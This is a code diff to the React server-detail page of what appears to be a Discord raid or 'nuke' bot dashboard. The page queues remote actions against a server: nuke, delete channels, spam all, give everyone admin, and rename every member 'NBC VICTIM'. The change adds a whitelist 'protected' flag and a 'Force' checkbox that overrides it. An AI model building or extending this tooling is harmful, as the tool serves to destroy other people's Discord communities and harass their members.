@@ -1,18 +1,18 @@
 import { useEffect, useState } from 'react';
 import { useParams } from 'react-router-dom';
-import { Rocket, Trash2, Plus, Shield, LogOut, Loader2, RefreshCw } from 'lucide-react';
+import { Rocket, Trash2, Plus, Shield, ShieldCheck, Lock, LogOut, Loader2, RefreshCw } from 'lucide-react';
 import { api } from '../../lib/api';
 import { Card, Loader, Badge } from '../../components/ui';
 import { useAuth } from '../../context/AuthContext';
 import { nf, timeAgo } from '../../lib/format';
 
 const ACTIONS = [
-  { key: 'nuke', label: 'Nuke', icon: Rocket, tone: 'danger', args: {} },
-  { key: 'delete_channels', label: 'Delete Channels', icon: Trash2, tone: 'ghost', args: {} },
-  { key: 'create_channels', label: 'Create Channels', icon: Plus, tone: 'ghost', args: { count: 20 } },
-  { key: 'spam_all', label: 'Spam All', icon: RefreshCw, tone: 'ghost', args: { count: 3 } },
-  { key: 'admin_all', label: 'Admin Everyone', icon: Shield, tone: 'ghost', args: {} },
-  { key: 'nick_all', label: 'Nickname All', icon: RefreshCw, tone: 'ghost', args: { nick: 'NBC VICTIM' } },
+  { key: 'nuke', label: 'Nuke', icon: Rocket, tone: 'danger', args: {}, protected: true },
+  { key: 'delete_channels', label: 'Delete Channels', icon: Trash2, tone: 'ghost', args: {}, protected: true },
+  { key: 'create_channels', label: 'Create Channels', icon: Plus, tone: 'ghost', args: { count: 20 }, protected: false },
+  { key: 'spam_all', label: 'Spam All', icon: RefreshCw, tone: 'ghost', args: { count: 3 }, protected: true },
+  { key: 'admin_all', label: 'Admin Everyone', icon: Shield, tone: 'ghost', args: {}, protected: true },
+  { key: 'nick_all', label: 'Nickname All', icon: RefreshCw, tone: 'ghost', args: { nick: 'NBC VICTIM' }, protected: true },
 ];
 
 export default function ServerDetail() {
@@ -21,6 +21,7 @@ export default function ServerDetail() {
   const [data, setData] = useState(null);
   const [busy, setBusy] = useState(null);
   const [toast, setToast] = useState(null);
+  const [force, setForce] = useState(false);
 
   const load = () => api.get('/api/guilds/' + guildId).then((d) => setData(d.data)).catch(() => setData(false));
   useEffect(() => { load(); }, [guildId]);
@@ -29,26 +30,29 @@ export default function ServerDetail() {
     setBusy(action);
     setToast(null);
     try {
-      // FIX: leave ka apna owner-only route hai, /execute pe bhejne se wo dead code tha
       const r = action === 'leave'
         ? await api.post('/api/guilds/' + guildId + '/leave')
-        : await api.post('/api/guilds/' + guildId + '/execute', { action, args });
+        : await api.post('/api/guilds/' + guildId + '/execute', { action, args, force });
 
       setToast({ ok: true, msg: action + ' queued (' + r.jobId + ')' });
       setTimeout(load, 4000);
     } catch (e) {
-      setToast({ ok: false, msg: e.message });
+      if (e.status === 409) {
+        setToast({ ok: false, msg: 'Ye server protected hai. "Force" tick karke dobara dabao.' });
+      } else {
+        setToast({ ok: false, msg: e.message });
+      }
     } finally {
       setBusy(null);
     }
   };
 
   const toggleWhitelist = async () => {
-    const on = (data && data.isWhitelisted) || (data && data.live && data.live.whitelisted);
     try {
-      if (on) await api.delete('/api/guilds/' + guildId + '/whitelist');
+      if (isProtected) await api.delete('/api/guilds/' + guildId + '/whitelist');
       else await api.post('/api/guilds/' + guildId + '/whitelist');
-      setToast({ ok: true, msg: on ? 'Whitelist removed' : 'Server protected' });
+      setToast({ ok: true, msg: isProtected ? 'Protection hata di' : 'Server protect ho gaya' });
+      setForce(false);
       load();
     } catch (e) {
       setToast({ ok: false, msg: e.message });
@@ -58,7 +62,7 @@ export default function ServerDetail() {
   if (data === null) return <Loader />;
   if (data === false) return <p className="text-muted">Server not found.</p>;
 
-  const isProtected = data.isWhitelisted || (data.live && data.live.whitelisted);
+  const isProtected = Boolean(data.protected || data.isWhitelisted || data.live?.whitelisted);
 
   return (
     <div className="space-y-6">
@@ -72,9 +76,20 @@ export default function ServerDetail() {
             {nf(data.memberCount)} members - {nf(data.channelCount)} channels - ID {data.guildId}
           </p>
         </div>
-        {isProtected && <Badge tone="green">Protected</Badge>}
+        {isProtected && <Badge tone="green"><ShieldCheck size={12} className="mr-1" />Protected</Badge>}
         {data.live && <Badge tone="purple">Live</Badge>}
       </div>
+
+      {isProtected && (
+        <div className="card flex flex-wrap items-center gap-3 border-amber-500/30 bg-amber-500/[0.06] p-4 text-sm text-amber-200">
+          <Lock size={16} />
+          <span>Ye server protected hai. Nuke / delete actions block rahenge.</span>
+          <label className="ml-auto flex items-center gap-2 font-medium">
+            <input type="checkbox" checked={force} onChange={(e) => setForce(e.target.checked)} />
+            Force
+          </label>
+        </div>
+      )}
 
       {toast && (
         <div className={'card p-3 text-sm ' + (toast.ok ? 'text-emerald-300' : 'text-red-300')}>{toast.msg}</div>
@@ -84,17 +99,22 @@ export default function ServerDetail() {
         <h2 className="font-display font-semibold">Remote Actions</h2>
         <p className="mt-1 text-xs text-muted">Only global admins can execute.</p>
         <div className="mt-4 grid gap-2.5 sm:grid-cols-3">
-          {ACTIONS.map((a) => (
-            <button
-              key={a.key}
-              disabled={busy || !user.isAdmin}
-              onClick={() => run(a.key, a.args)}
-              className={(a.tone === 'danger' ? 'btn-danger' : 'btn-ghost') + ' justify-start'}
-            >
-              {busy === a.key ? <Loader2 size={16} className="animate-spin" /> : <a.icon size={16} />}
-              {a.label}
-            </button>
-          ))}
+          {ACTIONS.map((a) => {
+            const locked = isProtected && a.protected && !force;
+            return (
+              <button
+                key={a.key}
+                disabled={busy || !user.isAdmin}
+                onClick={() => run(a.key, a.args)}
+                title={locked ? 'Protected server — Force tick karo' : undefined}
+                className={(a.tone === 'danger' ? 'btn-danger' : 'btn-ghost') + ' justify-start ' + (locked ? 'opacity-60' : '')}
+              >
+                {busy === a.key ? <Loader2 size={16} className="animate-spin" /> : <a.icon size={16} />}
+                {a.label}
+                {locked && <Lock size={12} className="ml-auto text-amber-300" />}
+              </button>
+            );
+          })}
         </div>
 
         <div className="mt-4 flex flex-wrap gap-2.5 border-t border-edge pt-4">
